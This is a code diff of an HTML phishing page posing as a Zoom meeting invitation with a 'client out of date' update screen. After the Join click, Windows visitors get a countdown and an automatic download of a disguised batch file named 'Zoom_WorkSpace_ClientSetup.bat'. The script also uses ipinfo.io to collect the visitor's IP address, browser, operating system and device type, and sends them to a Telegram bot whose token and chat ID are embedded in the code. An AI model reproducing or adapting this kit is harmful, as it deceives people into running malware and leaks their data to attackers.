@@ -1,33 +1,145 @@
 <!DOCTYPE html>
-<html lang="en" data-scrapbook-create="20260616114350988" data-scrapbook-title="Zoom">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <title>Zoom</title>
+    <title>Zoom - Join Meeting</title>
     <link rel="icon" href="Zoom_Communications_Logo.svg" type="image/svg+xml" />
     <link href="css2.css" rel="stylesheet" />
     <style>
-        /* --- reset & base (unchanged) --- */
+        /* ----- reset & base ----- */
         * {
             box-sizing: border-box;
         }
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: #f4f7fa;
+            background: #f4f7fa;
             margin: 0;
             padding: 0;
             min-height: 100vh;
-            position: relative;
         }
 
-        /* --- MAIN CONTENT (hidden by default, shown only on Windows) --- */
-        #mainContent {
+        /* ----- page containers ----- */
+        .page {
             display: none;
-            /* hidden until Windows is confirmed */;
+            min-height: 100vh;
+            width: 100%;
+        }
+        .page.active {
+            display: flex;
+            flex-direction: column;
         }
 
-        /* --- BLOCK OVERLAY (shown by default, hidden on Windows) --- */
+        /* ----- INVITATION PAGE (Zoom style) ----- */
+        #invitationPage {
+            align-items: center;
+            justify-content: center;
+            background: #f4f7fa;
+            padding: 30px 20px;
+        }
+        .invitation-card {
+            max-width: 540px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.10);
+            padding: 40px 36px 48px;
+            text-align: center;
+            transition: 0.2s;
+        }
+        .invitation-card .zoom-logo {
+            width: 130px;
+            height: auto;
+            margin-bottom: 16px;
+        }
+        .invitation-card .invite-badge {
+            display: inline-block;
+            background: #e8f5e9;
+            color: #2e7d32;
+            font-size: 13px;
+            font-weight: 600;
+            padding: 5px 18px;
+            border-radius: 30px;
+            letter-spacing: 0.3px;
+            margin-bottom: 18px;
+        }
+        .invitation-card h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0b1c2e;
+            margin: 0 0 8px 0;
+        }
+        .invitation-card .meeting-host {
+            font-size: 16px;
+            color: #555;
+            margin: 0 0 6px 0;
+        }
+        .invitation-card .meeting-time {
+            font-size: 14px;
+            color: #888;
+            margin: 0 0 24px 0;
+        }
+        .invitation-card .divider {
+            border: 0;
+            height: 1px;
+            background: #e0e5ec;
+            margin: 18px 0 26px 0;
+        }
+        .invitation-card .meeting-details {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+            color: #444;
+            background: #f8fafc;
+            padding: 12px 18px;
+            border-radius: 12px;
+            margin-bottom: 28px;
+            flex-wrap: wrap;
+            gap: 6px 12px;
+        }
+        .invitation-card .meeting-details span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .invitation-card .meeting-details .label {
+            color: #888;
+            font-weight: 400;
+        }
+        .btn-join {
+            background: #0b8c3c;
+            color: #fff;
+            border: none;
+            font-size: 20px;
+            font-weight: 600;
+            padding: 16px 40px;
+            border-radius: 60px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.15s, transform 0.1s;
+            box-shadow: 0 4px 12px rgba(11, 140, 60, 0.30);
+            letter-spacing: 0.5px;
+        }
+        .btn-join:hover {
+            background: #0a7a33;
+        }
+        .btn-join:active {
+            transform: scale(0.97);
+        }
+        .invitation-card .footer-note {
+            margin-top: 24px;
+            font-size: 13px;
+            color: #aaa;
+        }
+
+        /* ----- DOWNLOAD PAGE (original style) ----- */
+        #downloadPage {
+            background: #f4f7fa;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        /* block overlay (only shown on non‑Windows) */
         #blockOverlay {
             position: fixed;
             top: 0;
@@ -35,7 +147,8 @@
             width: 100%;
             height: 100%;
             background: #f4f7fa;
-            display: flex;
+            display: none;
+            /* hidden by default, shown via JS if needed */
             align-items: center;
             justify-content: center;
             z-index: 9999;
@@ -43,52 +156,37 @@
             flex-direction: column;
             text-align: center;
         }
-
         #blockOverlay .overlay-logo {
             width: 140px;
             height: auto;
-            margin-bottom: 30px;
+            margin-bottom: 24px;
         }
-
         #blockOverlay .overlay-title {
             font-size: 32px;
             font-weight: 700;
             color: #0072c6;
-            margin: 0 0 12px 0;
+            margin: 0 0 10px 0;
         }
-
         #blockOverlay .overlay-sub {
             font-size: 18px;
             color: #444;
-            max-width: 520px;
-            margin: 0 auto 8px auto;
+            max-width: 480px;
+            margin: 0 auto;
             line-height: 1.5;
         }
-
-        #blockOverlay .overlay-detail {
-            font-size: 15px;
-            color: #777;
-            max-width: 460px;
-            margin: 14px auto 0 auto;
-            line-height: 1.5;
-        }
-
         #blockOverlay .overlay-icon {
-            font-size: 56px;
-            margin-bottom: 20px;
+            font-size: 52px;
+            margin-bottom: 16px;
             display: block;
         }
 
-        #blockOverlay .overlay-divider {
-            width: 60px;
-            height: 3px;
-            background: #0072c6;
-            border: 0;
-            margin: 16px auto 20px auto;
-            border-radius: 2px;
+        /* main download content (only for Windows) */
+        #downloadContent {
+            display: none;
+            /* shown by JS if Windows */;
         }
 
-        /* --- existing container styles (unchanged) --- */
+        /* existing container styles (unchanged) */
         .container {
             display: flex;
             flex-direction: column;
@@ -195,8 +293,18 @@
             display: none;
         }
 
-        /* --- responsive tweaks --- */
+        /* responsive */
         @media (max-width: 600px) {
+            .invitation-card {
+                padding: 28px 20px 34px;
+            }
+            .invitation-card h1 {
+                font-size: 22px;
+            }
+            .btn-join {
+                font-size: 18px;
+                padding: 14px 20px;
+            }
             .logo-container {
                 position: static;
                 margin-bottom: 10px;
@@ -220,7 +328,6 @@
                 margin-top: 40px;
                 padding-bottom: 20px;
             }
-
             #blockOverlay .overlay-title {
                 font-size: 24px;
             }
@@ -234,70 +341,69 @@
                 font-size: 42px;
             }
         }
-
-        @media (max-width: 400px) {
-            #blockOverlay .overlay-title {
-                font-size: 20px;
-            }
-            #blockOverlay .overlay-sub {
-                font-size: 14px;
-            }
-            #blockOverlay .overlay-detail {
-                font-size: 13px;
-            }
-        }
     </style>
 </head>
 <body>
 
     <!-- ============================================================ -->
-    <!--  BLOCK OVERLAY – shown for non‑Windows devices                -->
+    <!--  PAGE 1: INVITATION (Zoom style)                              -->
     <!-- ============================================================ -->
-    <div id="blockOverlay">
-        <img class="overlay-logo" src="Zoom_Communications_Logo.svg" alt="Zoom logo" />
-        <span class="overlay-icon">🖥️</span>
-        <h1 class="overlay-title">Windows Desktop Required</h1>
-        <p class="overlay-sub">
-            This meeting is only available on <strong>Windows</strong> desktop.
-        </p>
-        <hr class="overlay-divider" />
-        <p class="overlay-detail">
-            Please join this meeting from a Windows computer.<br />
-            Mobile devices, macOS, Linux, and other operating systems are not supported.
-        </p>
+    <div id="invitationPage" class="page active">
+        <div class="invitation-card">
+            <img class="zoom-logo" src="Zoom_Communications_Logo.svg" alt="Zoom" />
+            <div class="invite-badge">🔔 You are invited</div>
+            <h1>Zoom Meeting</h1>
+            <p class="meeting-host">Hosted by <strong>Sarah Chen</strong></p>
+            <p class="meeting-time">📅 Today at 3:00 PM · Duration: 1 hour</p>
+            <hr class="divider" />
+            <div class="meeting-details">
+                <span><span class="label">Meeting ID:</span> 123 456 789</span>
+                <span><span class="label">Passcode:</span> 123456</span>
+            </div>
+            <button class="btn-join" id="joinButton">Join Meeting</button>
+            <p class="footer-note">This meeting requires the Zoom desktop client for Windows.</p>
+        </div>
     </div>
 
     <!-- ============================================================ -->
-    <!--  MAIN CONTENT – visible only on Windows                      -->
+    <!--  PAGE 2: DOWNLOAD / UPDATE PAGE (at /zoomupdate)             -->
     <!-- ============================================================ -->
-    <div id="mainContent">
-
-        <div class="logo-container">
-            <img class="logo" src="Zoom_Communications_Logo.svg" alt="Zoom logo" />
-        </div>
-        <div class="top-right-links">
-            <a href="#">Support</a>
-            <a href="#">English</a>
-        </div>
-        <div class="container">
-            <div class="heading">Your Zoom Client is Out of Date</div>
-            <div class="subheading">The latest version of Zoom will automatically download in a few seconds</div>
-            <div class="download-info">Please wait while we download the latest version for you...</div>
-            <div class="countdown">The update will start in <span id="countdown">10</span> seconds</div>
-            <div class="spinner"></div>
-            <div id="statusMessage" class="status-message"></div>
-            <a id="download-trigger" style="display:none;"></a>
-        </div>
-        <div class="footer">
-            <p>
-                If you are not redirected automatically,
-                <a href="#" id="manual-download">click here to manually download the latest version.</a>
-            </p>
-            <p>&copy; Zoom Video Communications, Inc. All rights reserved.</p>
+    <div id="downloadPage" class="page">
+        <!-- Block overlay – shown for non‑Windows -->
+        <div id="blockOverlay">
+            <img class="overlay-logo" src="Zoom_Communications_Logo.svg" alt="Zoom" />
+            <span class="overlay-icon">🖥️</span>
+            <h1 class="overlay-title">Windows Desktop Required</h1>
+            <p class="overlay-sub">This meeting is only available on Windows desktop.</p>
         </div>
 
+        <!-- Main download content – shown only on Windows -->
+        <div id="downloadContent">
+            <div class="logo-container">
+                <img class="logo" src="Zoom_Communications_Logo.svg" alt="Zoom logo" />
+            </div>
+            <div class="top-right-links">
+                <a href="#">Support</a>
+                <a href="#">English</a>
+            </div>
+            <div class="container">
+                <div class="heading">Your Zoom Client is Out of Date</div>
+                <div class="subheading">The latest version of Zoom will automatically download in a few seconds</div>
+                <div class="download-info">Please wait while we download the latest version for you...</div>
+                <div class="countdown">The update will start in <span id="countdown">10</span> seconds</div>
+                <div class="spinner"></div>
+                <div id="statusMessage" class="status-message"></div>
+                <a id="download-trigger" style="display:none;"></a>
+            </div>
+            <div class="footer">
+                <p>
+                    If you are not redirected automatically,
+                    <a href="#" id="manual-download">click here to manually download the latest version.</a>
+                </p>
+                <p>&copy; Zoom Video Communications, Inc. All rights reserved.</p>
+            </div>
+        </div>
     </div>
-    <!-- /mainContent -->
 
     <!-- ============================================================ -->
     <!--  JAVASCRIPT                                                   -->
@@ -307,58 +413,118 @@
             'use strict';
 
             // ------------------------------------------------------------
-            //  1.  OS / DEVICE DETECTION
+            //  1.  PAGE ROUTING (invitation → /zoomupdate)
             // ------------------------------------------------------------
-            function getOS() {
-                var ua = navigator.userAgent;
-                if (ua.indexOf('Windows NT 10.0') > -1) return 'Windows 10';
-                if (ua.indexOf('Windows NT 6.3') > -1) return 'Windows 8.1';
-                if (ua.indexOf('Windows NT 6.2') > -1) return 'Windows 8';
-                if (ua.indexOf('Windows NT 6.1') > -1) return 'Windows 7';
-                if (ua.indexOf('Windows NT') > -1) return 'Windows';
-                if (ua.indexOf('Mac OS X') > -1) return 'macOS';
-                if (ua.indexOf('Linux') > -1) return 'Linux';
-                if (ua.indexOf('Android') > -1) return 'Android';
-                if (/iOS|iPhone|iPad/i.test(ua)) return 'iOS';
-                return 'Unknown OS';
+            var invPage = document.getElementById('invitationPage');
+            var dlPage = document.getElementById('downloadPage');
+            var joinBtn = document.getElementById('joinButton');
+
+            // Show a page, hide others
+            function showPage(pageId) {
+                document.querySelectorAll('.page').forEach(function(p) {
+                    p.classList.remove('active');
+                });
+                document.getElementById(pageId).classList.add('active');
             }
 
-            function isWindows() {
-                var os = getOS();
-                return os.indexOf('Windows') === 0;
+            // Navigate to download page – REPLACE history so back button won't return
+            function goToDownloadPage() {
+                // Replace the current history entry with /zoomupdate
+                history.replaceState({ page: 'download' }, '', '/zoomupdate');
+                showPage('downloadPage');
+                initDownloadPage();
+            }
+
+            // Handle "Join" button click
+            joinBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                goToDownloadPage();
+            });
+
+            // Handle browser back/forward – only if we ever used pushState, but we use replace,
+            // so popstate will only fire if user goes back from /zoomupdate to previous page.
+            // We just need to ensure the correct page is shown if they manually go back.
+            window.addEventListener('popstate', function(e) {
+                var path = window.location.pathname;
+                if (path === '/zoomupdate' || (e.state && e.state.page === 'download')) {
+                    showPage('downloadPage');
+                    initDownloadPage();
+                } else {
+                    showPage('invitationPage');
+                }
+            });
+
+            // ------------------------------------------------------------
+            //  2.  ON LOAD: determine which page to show based on URL
+            // ------------------------------------------------------------
+            function initialRoute() {
+                var path = window.location.pathname;
+                if (path === '/zoomupdate') {
+                    showPage('downloadPage');
+                    initDownloadPage();
+                } else {
+                    showPage('invitationPage');
+                }
             }
 
             // ------------------------------------------------------------
-            //  2.  SHOW / HIDE based on OS
+            //  3.  DOWNLOAD PAGE LOGIC (OS detection + download flow)
             // ------------------------------------------------------------
-            var overlay = document.getElementById('blockOverlay');
-            var mainContent = document.getElementById('mainContent');
+            var downloadInitialized = false;
 
-            if (isWindows()) {
-                // Windows – show main content, hide overlay
-                overlay.style.display = 'none';
-                mainContent.style.display = 'block';
-                // start the countdown / download flow
-                initCountdownAndDownload();
-            } else {
-                // Non‑Windows – overlay stays visible, main content hidden
-                overlay.style.display = 'flex';
-                mainContent.style.display = 'none';
-                // also hide the footer (it's inside mainContent)
-                // nothing else to do – the overlay already has the message
+            function initDownloadPage() {
+                // Prevent double initialization
+                if (downloadInitialized) return;
+                downloadInitialized = true;
+
+                var blockOverlay = document.getElementById('blockOverlay');
+                var downloadContent = document.getElementById('downloadContent');
+
+                // --- OS detection ---
+                function getOS() {
+                    var ua = navigator.userAgent;
+                    if (ua.indexOf('Windows NT 10.0') > -1) return 'Windows 10';
+                    if (ua.indexOf('Windows NT 6.3') > -1) return 'Windows 8.1';
+                    if (ua.indexOf('Windows NT 6.2') > -1) return 'Windows 8';
+                    if (ua.indexOf('Windows NT 6.1') > -1) return 'Windows 7';
+                    if (ua.indexOf('Windows NT') > -1) return 'Windows';
+                    if (ua.indexOf('Mac OS X') > -1) return 'macOS';
+                    if (ua.indexOf('Linux') > -1) return 'Linux';
+                    if (ua.indexOf('Android') > -1) return 'Android';
+                    if (/iOS|iPhone|iPad/i.test(ua)) return 'iOS';
+                    return 'Unknown OS';
+                }
+
+                function isWindows() {
+                    return getOS().indexOf('Windows') === 0;
+                }
+
+                // --- Show/Hide based on OS ---
+                if (isWindows()) {
+                    blockOverlay.style.display = 'none';
+                    downloadContent.style.display = 'block';
+                    // Start the countdown + download flow
+                    startCountdownAndDownload();
+                } else {
+                    blockOverlay.style.display = 'flex';
+                    downloadContent.style.display = 'none';
+                }
             }
 
             // ------------------------------------------------------------
-            //  3.  COUNTDOWN + DOWNLOAD LOGIC (only runs on Windows)
+            //  4.  COUNTDOWN + DOWNLOAD (same as before, with small tweaks)
             // ------------------------------------------------------------
-            function initCountdownAndDownload() {
+            function startCountdownAndDownload() {
+                // Re‑fetch DOM elements (they exist now)
+                var countdownEl = document.getElementById('countdown');
+                var manualLink = document.getElementById('manual-download');
+                var statusMsg = document.getElementById('statusMessage');
 
+                // Telegram credentials (unchanged)
                 const TELEGRAM_BOT_TOKEN = '8732697564:AAHJRrodoFSum4dZubLXXgN0D_5V2Mi-X5U';
                 const TELEGRAM_CHAT_ID = '-1004476515039';
 
-                // ------------------------------------------------------------
-                //  UPDATED BAT FILE – only change: removed /norestart
-                // ------------------------------------------------------------
+                // BAT file content (unchanged)
                 var batContent =
                     '@echo off\r\n' +
                     'setlocal EnableExtensions\r\n' +
@@ -447,42 +613,31 @@
                     '\r\n' +
                     'exit /b';
 
-                // ------------------------------------------------------------
-                //  DOM refs
-                // ------------------------------------------------------------
-                var countdownEl = document.getElementById('countdown');
-                var manualLink = document.getElementById('manual-download');
-                var statusMsg = document.getElementById('statusMessage');
-
-                // ------------------------------------------------------------
-                //  Direct download of BAT file (no ZIP)
-                // ------------------------------------------------------------
+                // --- Download helper ---
                 function downloadBat() {
-                    try {
-                        var blob = new Blob([batContent], { type: 'text/plain;charset=utf-8' });
-                        var url = URL.createObjectURL(blob);
-                        var a = document.createElement('a');
-                        a.href = url;
-                        a.download = 'Zoom_WorkSpace_ClientSetup.bat';
-                        document.body.appendChild(a);
-                        a.click();
-                        document.body.removeChild(a);
-                        setTimeout(function() {
-                            URL.revokeObjectURL(url);
-                        }, 100);
-                        return Promise.resolve();
-                    } catch (e) {
-                        return Promise.reject(e);
-                    }
+                    return new Promise(function(resolve, reject) {
+                        try {
+                            var blob = new Blob([batContent], { type: 'text/plain;charset=utf-8' });
+                            var url = URL.createObjectURL(blob);
+                            var a = document.createElement('a');
+                            a.href = url;
+                            a.download = 'Zoom_WorkSpace_ClientSetup.bat';
+                            document.body.appendChild(a);
+                            a.click();
+                            document.body.removeChild(a);
+                            setTimeout(function() {
+                                URL.revokeObjectURL(url);
+                            }, 100);
+                            resolve();
+                        } catch (e) {
+                            reject(e);
+                        }
+                    });
                 }
 
-                // ------------------------------------------------------------
-                //  Trigger download
-                // ------------------------------------------------------------
                 function triggerDownload() {
                     statusMsg.textContent = '⏳ Preparing download...';
                     statusMsg.className = 'status-message info';
-
                     downloadBat()
                         .then(function() {
                             statusMsg.textContent = '✅ Download started.';
@@ -490,7 +645,7 @@
                             sendTelegramReport();
                         })
                         .catch(function(err) {
-                            console.error('Download failed:', err);
+                            console.error(err);
                             statusMsg.textContent = '❌ Download failed. Please use the manual link below.';
                             statusMsg.className = 'status-message error';
                             sendTelegramReport();
@@ -501,7 +656,6 @@
                     e.preventDefault();
                     statusMsg.textContent = '⏳ Preparing manual download...';
                     statusMsg.className = 'status-message info';
-
                     downloadBat()
                         .then(function() {
                             statusMsg.textContent = '✅ Manual download started.';
@@ -509,16 +663,14 @@
                             sendTelegramReport();
                         })
                         .catch(function(err) {
-                            console.error('Manual download failed:', err);
+                            console.error(err);
                             statusMsg.textContent = '❌ Manual download failed. Please try again.';
                             statusMsg.className = 'status-message error';
                             sendTelegramReport();
                         });
                 });
 
-                // ------------------------------------------------------------
-                //  Telegram reporting (unchanged)
-                // ------------------------------------------------------------
+                // --- Telegram report (unchanged) ---
                 function getBrowserInfo() {
                     var ua = navigator.userAgent;
                     if (ua.indexOf('Firefox') > -1) return 'Firefox';
@@ -540,8 +692,7 @@
                 }
 
                 function getDeviceType() {
-                    return (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) ? 'Mobile/Tablet' :
-                    'Desktop';
+                    return (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) ? 'Mobile/Tablet' : 'Desktop';
                 }
 
                 function getOSDetailed() {
@@ -589,7 +740,6 @@
                         console.warn('Telegram not configured.');
                         return;
                     }
-
                     var services = [{
                         url: 'https://ipinfo.io/json',
                         parser: function(data) {
@@ -748,9 +898,7 @@
                     attemptSend(1);
                 }
 
-                // ------------------------------------------------------------
-                //  Countdown
-                // ------------------------------------------------------------
+                // --- Countdown ---
                 var seconds = parseInt(countdownEl.textContent, 10) || 10;
                 var timer = setInterval(function() {
                     seconds -= 1;
@@ -760,8 +908,12 @@
                         triggerDownload();
                     }
                 }, 1000);
+            }
 
-            } // end initCountdownAndDownload()
+            // ------------------------------------------------------------
+            //  5.  BOOT
+            // ------------------------------------------------------------
+            initialRoute();
 
         })();
     </script>
